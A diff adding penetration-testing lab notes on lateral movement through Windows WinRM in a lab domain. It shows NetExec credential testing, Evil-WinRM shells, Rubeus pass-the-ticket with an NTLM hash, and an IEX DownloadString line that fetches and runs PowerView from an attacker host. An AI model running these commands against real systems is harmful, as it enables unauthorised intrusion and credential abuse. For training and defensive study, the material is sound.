@@ -1124,3 +1124,441 @@ WMI         172.20.0.52  135    SRV02            [+] Executed command: "whoami" 
 WMI         172.20.0.52  135    SRV02            inlanefreight\helen
 ```
 
+### WinRM
+
+... is Microsoft's version of the WS-Management (_Web Services-Management_) protocol, a standard protocol for managig software and hardware remotely. WinRM facilitates the transfer of management data between computers, enabling administrators to perform a variety of tasks, such as running scripts and retrieving event data from remote systems.
+
+WinRM is commonly used in conjunction with PowerShell for automation and administrative purposes, making it an indispensable tool for managing Windows environments. It provides a secure and efficient method to interact with remote systems, leveraging established web standards to ensure compatibility and flexibility. WinRM communicatin primarily utilizes TCP port 5985 for HTTP and 5986 for HTTPS.
+
+#### Rights
+
+To abuse WinRM for lateral movement, specific rights are required on the target system. While administrative privileges are often necessary, non-administrator accounts can also be granted with the required permissions to use WinRM. By default, members of the Remote Management Users group have the necessary access. Additionally, certain configurations and policies can grant WinRM access to other users.
+
+Identifying users with the rights to use WinRM involves checking group memberships, group policies, and testing credentials.
+
+- **Remote Management Users Group**: Members of this group inherently have the permissions needed to use WinRM.
+- **Group Policies**: Review group policies that might grant WinRM access to specific users.
+- **Testing Credentials**: Test if various credentials can successfully connect via WinRM using different tools to verify their validity and access rights.
+- **AD**: You can use tools such as BloodHound or LDAP queries to find users with WinRM rights.
+
+#### Enum
+
+Before using WinRM for lateral movement, it is essential to determine which systems have WinRM enabled and accessible. Enumeration can be performed using various tools and scripts to identify targets.
+
+```bash
+d41y@htb[/htb]$ nmap -p5985,5986 10.129.229.244 -sCV
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 12:52 AST
+Nmap scan report for 10.129.229.244
+Host is up (0.13s latency).
+
+PORT     STATE    SERVICE VERSION
+5985/tcp open     http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+5986/tcp filtered wsmans
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+To test credentials against WinRM, you can use NetExec:
+
+```bash
+d41y@htb[/htb]$ netexec winrm 10.129.229.244 -u frewdy -p Kiosko093
+WINRM       10.129.229.244  5985   SRV01            [*] Windows 10 / Server 2019 Build 17763 (name:SRV01) (domain:inlanefreight.local)
+WINRM       10.129.229.244  5985   SRV01            [+] inlanefreight.local\frewdy:Kiosko093 (Pwn3d!)
+```
+
+To enumerate WinRM rights, you can use BloodHound. However, even if you use BloodHound, it will not query the local group members. The only way to check if an account has the rights to connect over WinRM is through testing. When you compromise an account, it is recommended that you try different ways to perform lateral movement.
+
+#### Lateral Movement from Windows
+
+You can use PowerShell to interact with WinRM on Windows. PowerShell has cmdlets such as `Invoke-Command` and `Enter-PSSession` to manage and execute commands on remote systems.
+
+You need to launch a PowerShell session as the account you want to use to interact with the remote computer. In this case, you are using Helen's credentials, as this account is a member of Remote Management Users on SRV02.
+
+```powershell
+PS C:\Tools> Invoke-Command -ComputerName srv02 -ScriptBlock { hostname;whoami }
+SRV02
+inlanefreight\helen
+```
+
+Additionally, you can specify credentials with the `-Credential` parameter:
+
+```bash
+PS C:\Tools> $username = "INLANEFREIGHT\Helen"
+PS C:\Tools> $password = "RedRiot88"
+PS C:\Tools> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS C:\Tools> $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
+PS C:\Tools> Invoke-Command -ComputerName 172.20.0.52 -Credential $credential -ScriptBlock { whoami; hostname }
+inlanefreight\helen
+SRV02
+```
+
+> [!INFO]
+> If you use the IP instead of the computer name, you must use explicit credentials, or alternatively, you can use the flag `-Authentication Negotiate` instead of providing explicit credentials.
+
+`winrs` is a command line tool allowing to execute commands on a Windows machine using WinRM remotely.
+
+```powershell
+PS C:\Tools> winrs -r:srv02 "powershell -c whoami;hostname"
+inlanefreight\helen
+SRV02
+```
+
+`winrs` also allows you to use explicit credentials with the options `/username:<username>` and `/password:<password>` as follows:
+
+```powershell
+PS C:\Tools> winrs /remote:srv02 /username:helen /password:RedRiot88 "powershell -c whoami;hostname"
+inlanefreight\helen
+SRV02
+```
+
+##### Copy Files
+
+PowerShell provides robust functionality for copying files between systems, which is especially useful during lateral movement. One effective way to achieve this is by using PowerShell remoting sessions over WinRM. This approach allows for secure and efficient file transfer between remote systems.
+
+To copy files using a PowerShell session, you first need to establish a remote session with the target machine. This can be done using the `New-PSSession` cmdlet. Create a variable and name it `$sessionSRV02`:
+
+```powershell
+PS C:\Tools> $sessionSRV02 = New-PSSession -ComputerName SRV02 -Credential $credential
+```
+
+Once the session is established, you can use the `Copy-Item` cmdlet to copy from or to the target machine. To copy a file in your current machine to the target machine, you need to use the command `-ToSession <sessionVariable>` to specify the path of the file you want to transfer with the option `-Path <local file>` and the destination on the target machine with the option `-Destination <path remote machine>`:
+
+```powershell
+PS C:\Tools> Copy-Item -ToSession $sessionSRV02 -Path 'C:\Users\helen\Desktop\Sample.txt' -Destination 'C:\Users\helen\Desktop\Sample.txt' -Verbose
+VERBOSE: Performing the operation "Copy File" on target "Item: C:\Users\helen\Desktop\Sample.txt Destination: C:\Users\helen\Desktop\Sample.txt".
+```
+
+If you want to do the opposite and copy a file from the target machine, you need to use `-FromSession <sessionVariable>`:
+
+```powershell
+PS C:\Tools> Copy-Item -FromSession $sessionSRV02 -Path 'C:\Windows\System32\drivers\etc\hosts' -Destination 'C:\Users\helen\Desktop\host.txt' -Verbose
+VERBOSE: Performing the operation "Copy File" on target "Item: C:\Windows\System32\drivers\etc\hosts Destination: C:\Users\helen\Desktop\host.txt".
+```
+
+##### Interactive Shell
+
+You can use the `Enter-PSSession` cmdlet for an interactive shell using PowerShell remoting. This cmdlet allows you to initiate an interactive session with the remote computer, either by using a session created with `New-PSSession`, specifying explicit credentials, or leveraging the current session where the command is executed. For instance, reuse the `$sessionSRV02` variable you previously created. Specifying the `Enter-PSSession` and the variable will give you an interactive PowerShell prompt on the remote computer, allowing you to execute commands as if you were logged in directly:
+
+```powershell
+PS C:\Tools> Enter-PSSession $sessionSRV02
+[SRV02]: PS C:\Users\helen\Documents>
+```
+
+##### Using Hashes and Tickets with WinRM
+
+Additionally, you can also use kerberos tickets to connect to PowerShell remoting. To do this, you will use Rubeus. First you need to forge your TGT.
+
+```powershell
+PS C:\Tools>  .\Rubeus.exe asktgt /user:leonvqz /rc4:3223DA033D176ABAAF6BEAA0AA681400 /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.2
+
+[*] Action: Ask TGT
+
+[*] Got domain: inlanefreight.local
+[*] Using rc4_hmac hash: 3223DA033D176ABAAF6BEAA0AA681400
+[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.local\leonvqz'
+[*] Using domain controller: 172.20.0.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFsjCCBa6gAwIBBaEDAgEWooIEszCCBK9hgg
+
+  ServiceName              :  krbtgt/inlanefreight.local
+  ServiceRealm             :  INLANEFREIGHT.LOCAL
+  UserName                 :  leonvqz (NT_PRINCIPAL)
+  UserRealm                :  INLANEFREIGHT.LOCAL
+...SNIP...
+```
+
+Next, you need to create a sacrificial process with the option `createnetonly`.
+
+```powershell
+PS C:\Tools> .\Rubeus.exe createnetonly /program:powershell.exe /show
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.2
+
+[*] Action: Create Process (/netonly)
+
+[*] Using random username and password.
+
+[*] Showing process : True
+[*] Username        : SB09OE04
+[*] Domain          : 16GFWBFF
+[*] Password        : 5AB6RGSG
+[+] Process         : 'powershell.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 2088
+[+] LUID            : 0xded959c
+```
+
+The above command will present you a PowerShell window with dummy credentials, you will use to import the TGT of the account you want to use:
+
+```powershell
+PS C:\Tools> .\Rubeus.exe ptt /ticket:doIFsjCCBa6gAwIBBaEDAgEWooIEszCCBK9h...SNIP...
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.2
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+```
+
+Now you can use this session to connect to the target machine:
+
+```powershell
+PS C:\Tools> Enter-PSSession SRV02.inlanefreight.local -Authentication Negotiate
+[SRV02.inlanefreight.local]: PS C:\Users\Leonvqz\Documents> hostname
+SRV02
+```
+
+Now that you are connected to this machine, if you try to use this session to connect to a different target over the network, it won't work because of the double hop problem. A workaround is to use Rubeus within this session to forge a ticket and import it so you can use it for further authentication.
+
+##### PowerShell Errors
+
+Depending on the context, you may get a PowerShell error while attempting to connect to a remote host from Windows. Those errors are typically related to rights, authentication method, network access, or TrustedHost configuration. In the following example, you got an error because you attempted to use the target machine's name instead of the FQDN. Sometimes, Kerberos won't work unless you use the FQDN.
+
+```powershell
+PS C:\Tools> Enter-PSSession srv02
+Enter-PSSession : Processing data from remote server srv02 failed with the following error message: WinRM cannot
+process the request. The following error with errorcode 0x80090322 occurred while using Kerberos authentication: An
+unknown security error occurred.
+ Possible causes are:
+  -The user name or password specified are invalid.
+  -Kerberos is used when no authentication method and no user name are specified.
+  -Kerberos accepts domain user names, but not local user names.
+  -The Service Principal Name (SPN) for the remote computer name and port does not exist.
+  -The client and remote computers are in different domains and there is no trust between the two domains.
+ After checking for the above issues, try the following:
+  -Check the Event Viewer for events related to authentication.
+  -Change the authentication method; add the destination computer to the WinRM TrustedHosts configuration setting or
+use HTTPS transport.
+ Note that computers in the TrustedHosts list might not be authenticated.
+   -For more information about WinRM configuration, run the following command: winrm help config. For more
+information, see the about_Remote_Troubleshooting Help topic.
+At line:1 char:1
++ Enter-PSSession srv02
++ ~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (srv02:String) [Enter-PSSession], PSRemotingTransportException
+    + FullyQualifiedErrorId : CreateRemoteRunspaceFailed
+```
+
+You can try to use the FQNM instead:
+
+```powershell
+PS C:\Tools> Enter-PSSession srv02.inlanefreight.local
+[srv02.inlanefreight.local]: PS C:\Users\Helen\Documents>
+```
+
+Additionally, you can get a `TrustedHosts` as follows:
+
+```powershell
+PS C:\Tools> Enter-PSSession srv02 -Authentication Negotiate
+Enter-PSSession : Connecting to remote server srv02 failed with the following error message : The WinRM client cannot
+process the request.  Default credentials with Negotiate over HTTP can be used only if the target machine is part of
+the TrustedHosts list or the Allow implicit credentials for Negotiate option is specified. For more information, see
+the about_Remote_Troubleshooting Help topic.
+At line:1 char:1
++ Enter-PSSession srv02 -Authentication Negotiate
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (srv02:String) [Enter-PSSession], PSRemotingTransportException
+    + FullyQualifiedErrorId : CreateRemoteRunspaceFailed
+```
+
+> [!TIP]
+> Keep in mind that using `-Authentication Negotiate` will select either Kerberos or NTLM as the underlying authentication mechanism based on what both the client and server support and prefer. It is good to use this flag if you are having authentication issues.
+
+To solve this issue you can use the following command:
+
+```powershell
+PS C:\Tools> Set-Item WSMan:localhost\client\trustedhosts -value * -Force
+```
+
+If you are not admins, you can use explicit credentials with `-Credential` or `Invoke-Command`.
+
+#### Just Enough Administration (_JEA_)
+
+... is a security technology designed to provide delegated administration capabilities for tasks managed with PowerShell. JEA helps mitigate security risks by allowing administrators to limit the scope of administrative privileges. By using JEA, administrators can ensure that users only have the permission necessary to perform specific tasks, reducing the attack surface and minimizing the risk of accidental or intentional misuse of administrative privileges.
+
+JEA is particularly useful in environments where least privilege principles are critical. It allows organizations to create PowerShell endpoints with tailored roles and capabilities, ensuring users can only execute predefined commands and access specific resources. This approach enhances security and simplifies compliance with organizational policies and regulatory requirements by ensuring that administrative actions are tightly controlled and auditable. Further reads [here](https://www.scriptjunkie.us/2016/10/just-too-much-administration-breaking-jea-powershells-new-security-barrier/), and [here](https://securityaffairs.com/52084/hacking/jea-profiles-abuses.html).
+
+#### Lateral Movement from Linux
+
+##### NetExec
+
+With NetExec you can use the option `-x` or `-X` to execute CMD or PowerShell commands.
+
+```bash
+d41y@htb[/htb]$ netexec winrm 10.129.229.244 -u frewdy -p Kiosko093 -x "ipconfig"
+WINRM       10.129.229.244  5985   SRV01            [*] Windows 10 / Server 2019 Build 17763 (name:SRV01) (domain:inlanefreight.local)
+WINRM       10.129.229.244  5985   SRV01            [+] inlanefreight.local\frewdy:Kiosko093 (Pwn3d!)
+WINRM       10.129.229.244  5985   SRV01            [-] Execute command failed, current user: 'inlanefreight.local\frewdy' has no 'Invoke' rights to execute command (shell type: cmd)
+WINRM       10.129.229.244  5985   SRV01            [+] Executed command (shell type: powershell)
+WINRM       10.129.229.244  5985   SRV01            
+WINRM       10.129.229.244  5985   SRV01            Windows IP Configuration
+WINRM       10.129.229.244  5985   SRV01            
+WINRM       10.129.229.244  5985   SRV01            
+WINRM       10.129.229.244  5985   SRV01            Ethernet adapter Ethernet1:
+WINRM       10.129.229.244  5985   SRV01            
+WINRM       10.129.229.244  5985   SRV01            Connection-specific DNS Suffix  . :
+WINRM       10.129.229.244  5985   SRV01            Link-local IPv6 Address . . . . . : fe80::206d:76ce:27d6:960b%7
+WINRM       10.129.229.244  5985   SRV01            IPv4 Address. . . . . . . . . . . : 172.20.0.51
+WINRM       10.129.229.244  5985   SRV01            Subnet Mask . . . . . . . . . . . : 255.255.255.0
+WINRM       10.129.229.244  5985   SRV01            Default Gateway . . . . . . . . .
+```
+
+##### Evil-WinRM
+
+You can use `evil-winrm` to connect to a remote Windows machine and execute commands. You must specify the option `-i <target>` and the credentials with the options `-u <domain>\<user>` for users and for password `-p <password>`.
+
+```bash
+d41y@htb[/htb]$ evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\frewdy' -p Kiosko093
+
+Evil-WinRM shell v3.5
+...SNIP...
+*Evil-WinRM* PS C:\Users\frewdy\Documents> hostname;whoami
+SRV01
+inlanefreight\frewdy
+```
+
+Additionally, `evil-winrm` comes with features that facilitate interaction with remote systems and bypass common security mechanisms. You can get access to the features using the `menu` command from the interactive shell:
+
+```bash
+d41y@htb[/htb]$ 
+*Evil-WinRM* PS C:\Users\frewdy\Documents> menu
+
+
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+
+       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+
+[+] Dll-Loader 
+[+] Donut-Loader 
+[+] Invoke-Binary
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+```
+
+Evil-WinRM allows you to load PowerShell scripts. You must specify the `-s <PATH>` option and, within that path, save the scripts you want to import. You need to specify the file's name to import a script to the Evil-WinRM shell.
+
+```bash
+d41y@htb[/htb]$ evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\frewdy' -p Kiosko093 -s '/home/plaintext/'
+*Evil-WinRM* PS C:\Users\frewdy\Documents> PowerView.ps1
+*Evil-WinRM* PS C:\Users\frewdy\Documents> menu
+                                         
+                                         
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)        
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \      
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+
+       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+
+[+] Add-DomainGroupMember 
+[+] Add-DomainObjectAcl 
+[+] Add-RemoteConnection
+```
+
+In the above command, you established a session and invoked `PowerView.ps1` because `PowerView.ps1` is located at `/home/plaintext`. Next, you executed the `menu` command, which displayed not only the default menu options but also the cmdlets available since you imported PowerView.
+
+Additionally, you can also load DLLs or [Donut](https://github.com/TheWover/donut) payloads.
+
+#### Windows PowerShell Web Access
+
+It is also possible that the Administrator configures Windows PowerShell Web Access, which provides a web-based interface for accessing PowerShell sessions remotely. This feature allows users to run PowerShell commands and scripts from a web browser, offering flexibility and convenience for remote managament tasks. Accessing PowerShell through a web portal allows users to perform administrative tasks on remote system without needing a direct remote desktop connection or VPN access.
+
+![windows lateral movement 7](../../../images/windows_lateral_movement7.png)
+
+> [!NOTE]
+> By default the URL path for PowerShell Web Access is `/pswa` and the port will be 80 or 443.
+
+Valid credentials are required to authenticate with PowerShell remoting. These credentials must have appropriate permissions on the target system to initiate and execute remote PowerShell commands. Depending on the configuration, this could involve standard user accounts or accounts with elevated privileges, such as those belonging to the Remote Management Users group or local Administrators.
+
+Connecting:
+
+![windows lateral movement 8](../../../images/windows_lateral_movement8.png)
+
+When working with PowerShell Web Access and needing to retrieve large amounts of information, you should consider using Base64 output to optimize the process. PowerShell Web Access connects to the target machine to retrieve each line, meaning it may take much time to retrieve a large file if you are on a slow network.
+
+For example, if you try to get the contents of `C:\Windows\System32\drivers\etc\hosts` using `cat`, it will take some time to load due to the line-by-line transfer. Instead, you can use the following command to convert the file contents to Base64:
+
+```powershell
+PS C:\Tools> [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Windows\System32\drivers\etc\hosts"))
+```
+
+![windows lateral movement 9](../../../images/windows_lateral_movement9.png)
+
+This will load faster. You can then copy that content to a file, replace the break lines, and use `cat hosts_base64.txt | base64 -d > hosts` in a Linux terminal to decode the content quickly.
+
+In case you want to use PowerView through PowerShell Web Access you may get the following error:
+
+```powershell
+PS C:\Tools> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.87/PowerView.ps1')
+PS C:\Tools> Get-DomainUser
+Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
+"
+At line:5253 char:20
++             else { $Results = $UserSearcher.FindAll() }
++                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+ + FullyQualifiedErrorId : DirectoryServicesCOMException
+```
+
+To prevent this from happening, you must specify your credentials as follows:
+
+```powershell
+PS C:\Tools> $username = "INLANEFREIGHT\Helen"
+PS C:\Tools> $password = "RedRiot88"
+PS C:\Tools> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS C:\Tools> $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
+PS C:\Tools> Get-DomainUser -Credential $credential -FindOne
+
+logoncount                    : 1100
+badpasswordtime               : 6/27/2024 6:32:03 AM
+description                   : Built-in account for administering the computer/domain
+distinguishedname             : CN=Administrator,CN=Users,DC=inlanefreight,DC=local
+objectclass                   : {top, person, organizationalPerson, user}
+lastlogontimestamp            : 6/30/2024 6:21:56 AM
+name                          : Administrator
+lockout time                   : 0
+objectsid                     : S-1-5-21-2760730334-3436498779-657182845-500
+samaccountname                : Administrator
+logonhours                    : {255, 255, 255, 255...}
+...SNIP...
+```
+
